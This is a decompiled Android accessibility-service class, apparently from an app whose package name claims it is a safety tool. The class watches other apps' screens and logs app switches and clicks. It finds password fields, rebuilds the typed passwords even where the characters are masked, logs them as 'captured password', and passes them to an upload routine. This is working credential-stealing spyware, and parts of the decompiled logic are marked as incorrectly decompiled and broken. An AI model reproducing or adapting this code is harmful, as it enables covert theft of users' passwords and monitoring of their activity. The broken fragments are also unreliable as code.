package com.storm.safe.rock.service.modules;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0325b0;
import com.storm.safe.rock.util.AbstractC0385a0;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.C0873ms;
import p000.RunnableC0029ai;
import p000.dh0;
import p000.p21;
import p000.q81;
import p000.t60;
import p000.t81;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.b0 */
/* loaded from: classes2.dex */
public final class C0325b0 {

    /* renamed from: b5 */
    public static final String[] f53145b5;

    /* renamed from: b6 */
    public static final char[] f53146b6;

    /* renamed from: a0 */
    public final dqtvuisjd f53147a0;

    /* renamed from: a1 */
    public final Handler f53148a1;

    /* renamed from: a2 */
    public final ConcurrentHashMap f53149a2;

    /* renamed from: a3 */
    public String f53150a3;

    /* renamed from: a4 */
    public String f53151a4;

    /* renamed from: a5 */
    public String f53152a5;

    /* renamed from: a6 */
    public final StringBuilder f53153a6;

    /* renamed from: a7 */
    public int f53154a7;

    /* renamed from: a8 */
    public boolean f53155a8;

    /* renamed from: a9 */
    public final ArrayList f53156a9;

    /* renamed from: b0 */
    public final StringBuilder f53157b0;

    /* renamed from: b1 */
    public volatile long f53158b1;

    /* renamed from: b2 */
    public final q81 f53159b2;

    /* renamed from: b3 */
    public volatile String f53160b3;

    /* renamed from: b4 */
    public final AtomicBoolean f53161b4;

    static {
        new t81(null);
        f53145b5 = (String[]) AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55772c2, dh0.f55773c3), dh0.f55779c9), dh0.f55774c4)).toArray(new String[0]);
        f53146b6 = new char[]{8226, 9679, 11044, '*', 9702, 9675, 9673, 10625, 8729, 9900, 183, 65294, '.', 65106, 65290, 8226, 183};
    }

    public C0325b0(dqtvuisjd dqtvuisjdVar) {
        t60.m214695b6(dqtvuisjdVar, "service");
        this.f53147a0 = dqtvuisjdVar;
        HandlerThread handlerThread = new HandlerThread("UniversalInputMonitor-BG");
        handlerThread.setDaemon(true);
        handlerThread.start();
        this.f53148a1 = new Handler(handlerThread.getLooper());
        new Handler(Looper.getMainLooper());
        this.f53149a2 = new ConcurrentHashMap();
        this.f53150a3 = "";
        this.f53151a4 = "";
        this.f53152a5 = "";
        this.f53153a6 = new StringBuilder();
        this.f53154a7 = 50;
        this.f53156a9 = new ArrayList();
        this.f53157b0 = new StringBuilder();
        this.f53159b2 = new q81(this, 0);
        this.f53160b3 = "";
        this.f53161b4 = new AtomicBoolean(false);
    }

    /* renamed from: a1 */
    public static final boolean m211682a1(char c) {
        if (c == '*') {
            return true;
        }
        for (char c2 : f53146b6) {
            if (c2 == c) {
                return true;
            }
        }
        return false;
    }

    /* JADX WARN: Code restructure failed: missing block: B:11:0x001c, code lost:
    
        r0 = r0 + 1;
     */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m211683a2(String str) {
        if (str.length() > 0) {
            int i = 0;
            while (i < str.length()) {
                char cCharAt = str.charAt(i);
                for (char c : f53146b6) {
                    if (c == cCharAt) {
                        break;
                    }
                }
            }
            return true;
        }
        return false;
    }

    /* renamed from: a3 */
    public static boolean m211684a3(String str) {
        if (str.length() != 0) {
            String lowerCase = str.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            for (String str2 : f53145b5) {
                String lowerCase2 = str2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false)) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: a4 */
    public static boolean m211685a4(String str) {
        if (str.length() == 0) {
            return true;
        }
        int i = 0;
        for (int i2 = 0; i2 < str.length(); i2++) {
            if (Character.isLetterOrDigit(str.charAt(i2))) {
                i++;
            }
        }
        int i3 = 0;
        for (int i4 = 0; i4 < str.length(); i4++) {
            char cCharAt = str.charAt(i4);
            if (cCharAt != '*') {
                char[] cArr = f53146b6;
                int length = cArr.length;
                int i5 = 0;
                while (true) {
                    if (i5 >= length) {
                        if (cCharAt == '.' || cCharAt == 65294) {
                            break;
                        }
                    } else {
                        if (cArr[i5] == cCharAt) {
                            break;
                        }
                        i5++;
                    }
                }
                i3++;
            } else {
                i3++;
            }
        }
        return i <= 2 && i3 >= str.length() - 2;
    }

    /* renamed from: a6 */
    public static void m211686a6(String str) {
        String str2 = AbstractC0315a0.f53025a0;
        if (AbstractC0315a0.f53034a9 || AbstractC0315a0.f53032a7) {
            AbstractC0315a0.m211543a5(ActivityMonitor$LogType.f52728a0, str);
        }
    }

    /* renamed from: a7 */
    public static String m211687a7(ArrayList arrayList) {
        if (!arrayList.isEmpty()) {
            int size = arrayList.size();
            int length = 0;
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                String str = (String) obj;
                if (str.length() > length) {
                    length = str.length();
                }
            }
            if (length != 0) {
                char[] cArr = new char[length];
                for (int i2 = 0; i2 < length; i2++) {
                    cArr[i2] = '*';
                }
                int size2 = arrayList.size();
                int i3 = 0;
                while (i3 < size2) {
                    Object obj2 = arrayList.get(i3);
                    i3++;
                    String str2 = (String) obj2;
                    int length2 = str2.length();
                    for (int i4 = 0; i4 < length2; i4++) {
                        char cCharAt = str2.charAt(i4);
                        if (cCharAt != '*') {
                            cArr[i4] = cCharAt;
                        }
                    }
                }
                String str3 = new String(cArr);
                if (!AbstractC0779a1.m213653a6(str3, '*')) {
                    return str3;
                }
            }
        }
        return null;
    }

    /* renamed from: b0 */
    public static String m211688b0(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        try {
            if (Build.VERSION.SDK_INT < 26) {
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                return (contentDescription == null || (string = contentDescription.toString()) == null) ? "" : string;
            }
            CharSequence hintText = accessibilityNodeInfo.getHintText();
            if (hintText != null && (string2 = hintText.toString()) != null) {
                return string2;
            }
            CharSequence contentDescription2 = accessibilityNodeInfo.getContentDescription();
            return contentDescription2 != null ? contentDescription2.toString() : "";
        } catch (Exception unused) {
            return "";
        }
    }

    /* renamed from: a0 */
    public final void m211689a0(String str) {
        boolean z;
        String str2;
        if (this.f53155a8) {
            String string = this.f53153a6.toString();
            t60.m214694b5(string, "trackingBuilder.toString()");
            String string2 = AbstractC0779a1.m213687e0(string).toString();
            String strM211687a7 = m211687a7(this.f53156a9);
            if (strM211687a7 != null && !AbstractC0779a1.m213653a6(strM211687a7, '*')) {
                string2 = strM211687a7;
            }
            int length = string2.length();
            StringBuilder sb = this.f53157b0;
            if (length < 4 && sb.length() > 0) {
                String string3 = sb.toString();
                t60.m214694b5(string3, "eventPlainBuffer.toString()");
                string2 = AbstractC0779a1.m213687e0(string3).toString();
            }
            String string4 = sb.toString();
            t60.m214694b5(string4, "eventPlainBuffer.toString()");
            String string5 = AbstractC0779a1.m213687e0(string4).toString();
            int i = 0;
            int i2 = 0;
            while (true) {
                if (i2 >= string2.length()) {
                    z = false;
                    break;
                } else {
                    if (m211682a1(string2.charAt(i2))) {
                        z = true;
                        break;
                    }
                    i2++;
                }
            }
            int length2 = string5.length();
            if (4 > length2 || length2 >= 65) {
                str2 = string2;
            } else {
                int i3 = 0;
                while (true) {
                    if (i3 >= string5.length()) {
                        if (m211685a4(string5)) {
                            break;
                        }
                        if (!z && !m211685a4(string2)) {
                            int i4 = 0;
                            for (int i5 = 0; i5 < string2.length(); i5++) {
                                char cCharAt = string2.charAt(i5);
                                if (19968 <= cCharAt && cCharAt < 40960) {
                                    i4++;
                                }
                            }
                            if (i4 >= 2) {
                            }
                        }
                        str2 = string5;
                    } else if (m211682a1(string5.charAt(i3))) {
                        break;
                    } else {
                        i3++;
                    }
                }
                str2 = string2;
            }
            this.f53155a8 = false;
            this.f53148a1.removeCallbacks(this.f53159b2);
            if (str2.length() < 4 || str2.length() > 64) {
                m211691a8();
                return;
            }
            if (!m211683a2(str2)) {
                while (true) {
                    if (i >= str2.length()) {
                        if (!m211685a4(str2)) {
                            String str3 = this.f53151a4;
                            String str4 = this.f53150a3;
                            int i6 = this.f53154a7;
                            String string6 = AbstractC0779a1.m213687e0(str3).toString();
                            if (string6.length() == 0) {
                                string6 = AbstractC0779a1.m213687e0(AbstractC0779a1.m213683d6(str4, str4)).toString();
                                if (string6.length() == 0) {
                                    string6 = "未知应用";
                                }
                            }
                            String str5 = string6;
                            int length3 = str2.length();
                            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("🔑 捕获密码: app=", str3, " pkg=", str4, " type=");
                            sbM41c2.append(str5);
                            sbM41c2.append(" len=");
                            sbM41c2.append(length3);
                            sbM41c2.append(" conf=");
                            sbM41c2.append(i6);
                            sbM41c2.append(" reason=");
                            sbM41c2.append(str);
                            t60.m214714d6("UniversalInputMonitor", sbM41c2.toString());
                            m211686a6("密码输入: " + str2.length() + "位 [" + str3 + "]");
                            C0873ms c0873ms = AbstractC0385a0.f55229a0;
                            AbstractC0385a0.m212471a0(new UniversalInputMonitor$uploadPassword$1(this, str2, str5, str3, str4, i6, null));
                            m211691a8();
                            return;
                        }
                    } else if (m211682a1(str2.charAt(i))) {
                        break;
                    } else {
                        i++;
                    }
                }
            }
            m211686a6("密码输入: " + str2.length() + "位 [" + this.f53151a4 + "] (仅掩码/未拼全，已丢弃上报)");
            m211691a8();
        }
    }

    /* renamed from: a5 */
    public final void m211690a5(AccessibilityEvent accessibilityEvent, AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        final String string;
        String string2;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        boolean z;
        boolean z2;
        String string3;
        CharSequence charSequence;
        String string4;
        String string5;
        String string6;
        CharSequence packageName = accessibilityEvent.getPackageName();
        if (packageName == null || (string = packageName.toString()) == null || string.equals(this.f53147a0.getPackageName())) {
            return;
        }
        int eventType = accessibilityEvent.getEventType();
        boolean z3 = true;
        String str = "";
        if (eventType == 1) {
            List<CharSequence> text = accessibilityEvent.getText();
            String strM213295i2 = text != null ? AbstractC0715je.m213295i2(text, "", null, null, null, 62) : "";
            CharSequence contentDescription = accessibilityEvent.getContentDescription();
            final String str2 = (contentDescription == null || (string2 = contentDescription.toString()) == null) ? "" : string2;
            if (strM213295i2.length() <= 0 && str2.length() <= 0) {
                return;
            }
            final int i = 1;
            final String str3 = strM213295i2;
            this.f53148a1.post(new Runnable(this) { // from class: r81

                /* renamed from: a1 */
                public final /* synthetic */ C0325b0 f59642a1;

                {
                    this.f59642a1 = this;
                }

                /* JADX WARN: Removed duplicated region for block: B:32:0x00a4  */
                /* JADX WARN: Removed duplicated region for block: B:35:0x00ae  */
                /* JADX WARN: Removed duplicated region for block: B:40:0x00cc  */
                @Override // java.lang.Runnable
                /*
                    Code decompiled incorrectly, please refer to instructions dump.
                */
                public final void run() {
                    List list;
                    Iterator it;
                    switch (i) {
                        case 0:
                            String str4 = string;
                            t60.m214695b6(str4, "$prevPkg");
                            C0325b0 c0325b0 = this.f59642a1;
                            if (c0325b0.f53155a8) {
                                c0325b0.m211689a0("app_switch");
                            }
                            String strM211692a9 = str4.length() > 0 ? c0325b0.m211692a9(str4) : "";
                            String strM211692a92 = c0325b0.m211692a9(str3);
                            if (strM211692a9.length() > 0) {
                                C0325b0.m211686a6("离开: ".concat(strM211692a9));
                            }
                            C0325b0.m211686a6("打开: " + strM211692a92);
                            String strM213684d7 = AbstractC0779a1.m213684d7(str2, ".");
                            if (strM213684d7.length() > 0 && !AbstractC0779a1.m213652a5(strM213684d7, "$", false) && !strM213684d7.equals(strM211692a92)) {
                                C0325b0.m211686a6("页面: " + strM213684d7 + " [" + strM211692a92 + "]");
                                break;
                            }
                            break;
                        default:
                            C0325b0 c0325b02 = this.f59642a1;
                            ConcurrentHashMap concurrentHashMap = c0325b02.f53149a2;
                            String str5 = string;
                            String strM213684d72 = (String) concurrentHashMap.get(str5);
                            if (strM213684d72 == null) {
                                strM213684d72 = AbstractC0779a1.m213684d7(str5, ".");
                            }
                            String str6 = str3;
                            int length = str6.length();
                            String str7 = str2;
                            String str8 = length == 0 ? str7 : str6;
                            if (str8.length() > 0) {
                                C0325b0.m211686a6("点击: " + str8 + " [" + strM213684d72 + "]");
                            }
                            if (c0325b02.f53155a8) {
                                String lowerCase = (str6 + " " + str7).toLowerCase(Locale.ROOT);
                                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                List list2 = dh0.f55778c8;
                                if (list2 == null || !list2.isEmpty()) {
                                    Iterator it2 = list2.iterator();
                                    while (it2.hasNext()) {
                                        String lowerCase2 = ((String) it2.next()).toLowerCase(Locale.ROOT);
                                        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                        if (AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false)) {
                                        }
                                    }
                                    list = dh0.f55774c4;
                                    if (list != null || !list.isEmpty()) {
                                        it = list.iterator();
                                        while (it.hasNext()) {
                                            String lowerCase3 = ((String) it.next()).toLowerCase(Locale.ROOT);
                                            t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                            if (AbstractC0779a1.m213652a5(lowerCase, lowerCase3, false)) {
                                            }
                                        }
                                        if (!AbstractC0779a1.m213652a5(lowerCase, "submit", false) && !AbstractC0779a1.m213652a5(lowerCase, "next", false) && !AbstractC0779a1.m213652a5(lowerCase, "continue", false)) {
                                        }
                                    } else if (!AbstractC0779a1.m213652a5(lowerCase, "submit", false)) {
                                    }
                                } else {
                                    list = dh0.f55774c4;
                                    if (list != null) {
                                        it = list.iterator();
                                        while (it.hasNext()) {
                                        }
                                        if (!AbstractC0779a1.m213652a5(lowerCase, "submit", false)) {
                                        }
                                    }
                                }
                                c0325b02.m211689a0("confirm_click");
                                break;
                            }
                            break;
                    }
                }
            });
            return;
        }
        if (eventType == 8) {
            AccessibilityNodeInfo source = accessibilityEvent.getSource();
            if (source == null) {
                return;
            }
            try {
                boolean zIsPassword = source.isPassword();
                String strM211688b0 = m211688b0(source);
                String viewIdResourceName = source.getViewIdResourceName();
                if (viewIdResourceName != null) {
                    str = viewIdResourceName;
                }
                if (zIsPassword || m211684a3(strM211688b0)) {
                    this.f53148a1.post(new RunnableC0029ai(this, string, str, 4));
                } else if (this.f53155a8) {
                    this.f53148a1.post(new q81(this, 1));
                }
                source.recycle();
                return;
            } catch (Throwable th) {
                source.recycle();
                throw th;
            }
        }
        if (eventType != 16) {
            if (eventType != 32) {
                return;
            }
            CharSequence className = accessibilityEvent.getClassName();
            if (className != null && (string6 = className.toString()) != null) {
                str = string6;
            }
            final String str4 = this.f53160b3;
            if (string.equals(str4) || AbstractC0779a1.m213679d2(str, false, "android.") || AbstractC0779a1.m213679d2(str, false, "androidx.")) {
                return;
            }
            this.f53160b3 = string;
            final int i2 = 0;
            final String str5 = str;
            this.f53148a1.post(new Runnable(this) { // from class: r81

                /* renamed from: a1 */
                public final /* synthetic */ C0325b0 f59642a1;

                {
                    this.f59642a1 = this;
                }

                /* JADX WARN: Removed duplicated region for block: B:32:0x00a4  */
                /* JADX WARN: Removed duplicated region for block: B:35:0x00ae  */
                /* JADX WARN: Removed duplicated region for block: B:40:0x00cc  */
                @Override // java.lang.Runnable
                /*
                    Code decompiled incorrectly, please refer to instructions dump.
                */
                public final void run() {
                    List list;
                    Iterator it;
                    switch (i2) {
                        case 0:
                            String str42 = str4;
                            t60.m214695b6(str42, "$prevPkg");
                            C0325b0 c0325b0 = this.f59642a1;
                            if (c0325b0.f53155a8) {
                                c0325b0.m211689a0("app_switch");
                            }
                            String strM211692a9 = str42.length() > 0 ? c0325b0.m211692a9(str42) : "";
                            String strM211692a92 = c0325b0.m211692a9(string);
                            if (strM211692a9.length() > 0) {
                                C0325b0.m211686a6("离开: ".concat(strM211692a9));
                            }
                            C0325b0.m211686a6("打开: " + strM211692a92);
                            String strM213684d7 = AbstractC0779a1.m213684d7(str5, ".");
                            if (strM213684d7.length() > 0 && !AbstractC0779a1.m213652a5(strM213684d7, "$", false) && !strM213684d7.equals(strM211692a92)) {
                                C0325b0.m211686a6("页面: " + strM213684d7 + " [" + strM211692a92 + "]");
                                break;
                            }
                            break;
                        default:
                            C0325b0 c0325b02 = this.f59642a1;
                            ConcurrentHashMap concurrentHashMap = c0325b02.f53149a2;
                            String str52 = str4;
                            String strM213684d72 = (String) concurrentHashMap.get(str52);
                            if (strM213684d72 == null) {
                                strM213684d72 = AbstractC0779a1.m213684d7(str52, ".");
                            }
                            String str6 = string;
                            int length = str6.length();
                            String str7 = str5;
                            String str8 = length == 0 ? str7 : str6;
                            if (str8.length() > 0) {
                                C0325b0.m211686a6("点击: " + str8 + " [" + strM213684d72 + "]");
                            }
                            if (c0325b02.f53155a8) {
                                String lowerCase = (str6 + " " + str7).toLowerCase(Locale.ROOT);
                                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                List list2 = dh0.f55778c8;
                                if (list2 == null || !list2.isEmpty()) {
                                    Iterator it2 = list2.iterator();
                                    while (it2.hasNext()) {
                                        String lowerCase2 = ((String) it2.next()).toLowerCase(Locale.ROOT);
                                        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                        if (AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false)) {
                                        }
                                    }
                                    list = dh0.f55774c4;
                                    if (list != null || !list.isEmpty()) {
                                        it = list.iterator();
                                        while (it.hasNext()) {
                                            String lowerCase3 = ((String) it.next()).toLowerCase(Locale.ROOT);
                                            t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                            if (AbstractC0779a1.m213652a5(lowerCase, lowerCase3, false)) {
                                            }
                                        }
                                        if (!AbstractC0779a1.m213652a5(lowerCase, "submit", false) && !AbstractC0779a1.m213652a5(lowerCase, "next", false) && !AbstractC0779a1.m213652a5(lowerCase, "continue", false)) {
                                        }
                                    } else if (!AbstractC0779a1.m213652a5(lowerCase, "submit", false)) {
                                    }
                                } else {
                                    list = dh0.f55774c4;
                                    if (list != null) {
                                        it = list.iterator();
                                        while (it.hasNext()) {
                                        }
                                        if (!AbstractC0779a1.m213652a5(lowerCase, "submit", false)) {
                                        }
                                    }
                                }
                                c0325b02.m211689a0("confirm_click");
                                break;
                            }
                            break;
                    }
                }
            });
            return;
        }
        if (accessibilityNodeInfo == null) {
            AccessibilityNodeInfo source2 = accessibilityEvent.getSource();
            if (source2 == null) {
                return;
            } else {
                accessibilityNodeInfo2 = source2;
            }
        } else {
            accessibilityNodeInfo2 = accessibilityNodeInfo;
        }
        if (accessibilityNodeInfo == null) {
            z = true;
            z2 = false;
        } else {
            z = false;
            z2 = false;
        }
        try {
            final boolean zIsPassword2 = accessibilityNodeInfo2.isPassword();
            final String strM211688b02 = m211688b0(accessibilityNodeInfo2);
            if (!zIsPassword2 && !m211684a3(strM211688b02)) {
                z3 = z2;
            }
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (!z3 && jCurrentTimeMillis - this.f53158b1 < 150) {
                if (z) {
                    try {
                        accessibilityNodeInfo2.recycle();
                        return;
                    } catch (Exception unused) {
                        return;
                    }
                }
                return;
            }
            this.f53158b1 = jCurrentTimeMillis;
            String viewIdResourceName2 = accessibilityNodeInfo2.getViewIdResourceName();
            if (viewIdResourceName2 == null) {
                viewIdResourceName2 = "";
            }
            CharSequence text2 = accessibilityNodeInfo2.getText();
            final String str6 = (text2 == null || (string5 = text2.toString()) == null) ? "" : string5;
            List<CharSequence> text3 = accessibilityEvent.getText();
            final String str7 = (text3 == null || (charSequence = (CharSequence) AbstractC0715je.m213291h8(text3)) == null || (string4 = charSequence.toString()) == null) ? "" : string4;
            CharSequence beforeText = accessibilityEvent.getBeforeText();
            final String str8 = (beforeText == null || (string3 = beforeText.toString()) == null) ? "" : string3;
            final int addedCount = accessibilityEvent.getAddedCount();
            final int removedCount = accessibilityEvent.getRemovedCount();
            final String str9 = viewIdResourceName2;
            try {
                this.f53148a1.post(new Runnable() { // from class: s81
                    /* JADX WARN: Removed duplicated region for block: B:14:0x003c  */
                    /* JADX WARN: Removed duplicated region for block: B:19:0x004a  */
                    @Override // java.lang.Runnable
                    /*
                        Code decompiled incorrectly, please refer to instructions dump.
                    */
                    public final void run() {
                        String str10;
                        boolean z4;
                        String string7;
                        String strSubstring;
                        char cCharAt;
                        C0325b0 c0325b0 = this.f59921a0;
                        q81 q81Var = c0325b0.f53159b2;
                        Handler handler = c0325b0.f53148a1;
                        String str11 = strM211688b02;
                        t60.m214695b6(str11, "$hintText");
                        StringBuilder sb = c0325b0.f53153a6;
                        ArrayList arrayList = c0325b0.f53156a9;
                        StringBuilder sb2 = c0325b0.f53157b0;
                        boolean z5 = zIsPassword2;
                        boolean z6 = !z5 && C0325b0.m211684a3(str11);
                        if (z5 || z6) {
                            String str12 = string;
                            String strM211692a9 = c0325b0.m211692a9(str12);
                            String str13 = str7;
                            int length = str13.length();
                            String str14 = str6;
                            if (length <= 0 || C0325b0.m211683a2(str13)) {
                                if (str14.length() <= 0 || C0325b0.m211683a2(str14)) {
                                    str10 = str8;
                                    if (str10.length() <= 0 || C0325b0.m211683a2(str10)) {
                                        str10 = str13.length() == 0 ? str14 : str13;
                                    }
                                }
                            }
                            if (str14.length() == 0) {
                                z4 = z5;
                                string7 = "";
                            } else {
                                StringBuilder sb3 = new StringBuilder(str14.length());
                                int length2 = str14.length();
                                int i3 = 0;
                                while (i3 < length2) {
                                    boolean z7 = z5;
                                    char cCharAt2 = str14.charAt(i3);
                                    int i4 = i3;
                                    char[] cArr = C0325b0.f53146b6;
                                    int i5 = length2;
                                    int length3 = cArr.length;
                                    int i6 = 0;
                                    while (true) {
                                        if (i6 < length3) {
                                            int i7 = i6;
                                            if (cArr[i7] == cCharAt2) {
                                                sb3.append('*');
                                                break;
                                            }
                                            i6 = i7 + 1;
                                        } else if (cCharAt2 == '.' || cCharAt2 == 65294 || cCharAt2 == 183 || cCharAt2 == 65106 || cCharAt2 == 65290) {
                                            sb3.append('*');
                                        } else {
                                            sb3.append(cCharAt2);
                                        }
                                    }
                                    i3 = i4 + 1;
                                    z5 = z7;
                                    length2 = i5;
                                }
                                z4 = z5;
                                string7 = sb3.toString();
                                t60.m214694b5(string7, "sb.toString()");
                            }
                            String str15 = str9;
                            int i8 = addedCount;
                            int i9 = removedCount;
                            if (i8 <= 0 && i9 <= 0) {
                                if (str10.length() <= 0 || C0325b0.m211683a2(str10)) {
                                    return;
                                }
                                int i10 = z4 ? 90 : 70;
                                if (c0325b0.f53155a8 && t60.m214686a2(c0325b0.f53150a3, str12) && t60.m214686a2(c0325b0.f53152a5, str15)) {
                                    arrayList.clear();
                                    p21.m214238a3(sb2);
                                    p21.m214238a3(sb);
                                    sb.append(str10);
                                } else {
                                    if (c0325b0.f53155a8) {
                                        c0325b0.m211689a0("new_field");
                                    }
                                    c0325b0.f53155a8 = true;
                                    c0325b0.f53150a3 = str12;
                                    c0325b0.f53151a4 = strM211692a9;
                                    c0325b0.f53152a5 = str15;
                                    c0325b0.f53154a7 = i10;
                                    arrayList.clear();
                                    p21.m214238a3(sb2);
                                    p21.m214238a3(sb);
                                    sb.append(str10);
                                }
                                handler.removeCallbacks(q81Var);
                                handler.postDelayed(q81Var, 3000L);
                                return;
                            }
                            if (!c0325b0.f53155a8 || !t60.m214686a2(c0325b0.f53150a3, str12) || !t60.m214686a2(c0325b0.f53152a5, str15)) {
                                if (c0325b0.f53155a8) {
                                    c0325b0.m211689a0("new_field");
                                }
                                c0325b0.f53155a8 = true;
                                c0325b0.f53150a3 = str12;
                                c0325b0.f53151a4 = strM211692a9;
                                c0325b0.f53152a5 = str15;
                                c0325b0.f53154a7 = 40;
                                p21.m214238a3(sb);
                                arrayList.clear();
                                p21.m214238a3(sb2);
                            }
                            if (i9 > 0) {
                                int length4 = sb2.length();
                                sb2.delete(Math.max(0, length4 - i9), length4);
                            }
                            if (i8 > 0 && str13.length() > 0) {
                                int length5 = str13.length();
                                for (int i11 = 0; i11 < length5; i11++) {
                                    char cCharAt3 = str13.charAt(i11);
                                    if (Character.isLetterOrDigit(cCharAt3) || AbstractC0779a1.m213653a6("._-@#", cCharAt3)) {
                                        sb2.append(cCharAt3);
                                    }
                                }
                            }
                            if (string7.length() > 0) {
                                if (string7.length() == 0) {
                                    strSubstring = "";
                                } else {
                                    int i12 = 0;
                                    while (i12 < string7.length() && (cCharAt = string7.charAt(i12)) != '*' && !Character.isDigit(cCharAt) && (('a' > cCharAt || cCharAt >= '{') && ('A' > cCharAt || cCharAt >= '['))) {
                                        i12++;
                                    }
                                    strSubstring = string7.substring(i12);
                                    t60.m214694b5(strSubstring, "this as java.lang.String).substring(startIndex)");
                                }
                                if (strSubstring.length() > 0) {
                                    arrayList.add(strSubstring);
                                    while (arrayList.size() > 50) {
                                        arrayList.remove(0);
                                    }
                                }
                            }
                            String strM211687a7 = C0325b0.m211687a7(arrayList);
                            p21.m214238a3(sb);
                            if (strM211687a7 != null) {
                                sb.append(strM211687a7);
                            } else if (sb2.length() > 0) {
                                sb.append(sb2.toString());
                            }
                            handler.removeCallbacks(q81Var);
                            handler.postDelayed(q81Var, 3000L);
                        }
                    }
                });
                if (z) {
                    try {
                        accessibilityNodeInfo2.recycle();
                    } catch (Exception unused2) {
                    }
                }
            } catch (Throwable th2) {
                th = th2;
                Throwable th3 = th;
                if (!z) {
                    throw th3;
                }
                try {
                    accessibilityNodeInfo2.recycle();
                    throw th3;
                } catch (Exception unused3) {
                    throw th3;
                }
            }
        } catch (Throwable th4) {
            th = th4;
        }
    }

    /* renamed from: a8 */
    public final void m211691a8() {
        p21.m214238a3(this.f53153a6);
        this.f53150a3 = "";
        this.f53151a4 = "";
        this.f53152a5 = "";
        this.f53154a7 = 50;
        this.f53156a9.clear();
        p21.m214238a3(this.f53157b0);
    }

    /* renamed from: a9 */
    public final String m211692a9(String str) {
        boolean andSet = this.f53161b4.getAndSet(true);
        dqtvuisjd dqtvuisjdVar = this.f53147a0;
        ConcurrentHashMap concurrentHashMap = this.f53149a2;
        if (!andSet) {
            try {
                Map<String, ?> all = dqtvuisjdVar.getSharedPreferences("app_name_cache", 0).getAll();
                t60.m214694b5(all, "prefs.all");
                for (Map.Entry<String, ?> entry : all.entrySet()) {
                    String key = entry.getKey();
                    Object value = entry.getValue();
                    if (value instanceof String) {
                        t60.m214694b5(key, "k");
                        concurrentHashMap.put(key, value);
                    }
                }
            } catch (Exception unused) {
            }
        }
        String str2 = (String) concurrentHashMap.get(str);
        if (str2 != null) {
            return str2;
        }
        try {
            PackageManager packageManager = dqtvuisjdVar.getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(str, 0);
            t60.m214694b5(applicationInfo, "pm.getApplicationInfo(pkg, 0)");
            String string = packageManager.getApplicationLabel(applicationInfo).toString();
            concurrentHashMap.put(str, string);
            dqtvuisjdVar.getSharedPreferences("app_name_cache", 0).edit().putString(str, string).apply();
            return string;
        } catch (Exception unused2) {
            String strM213684d7 = AbstractC0779a1.m213684d7(str, ".");
            concurrentHashMap.put(str, strM213684d7);
            return strM213684d7;
        }
    }
}
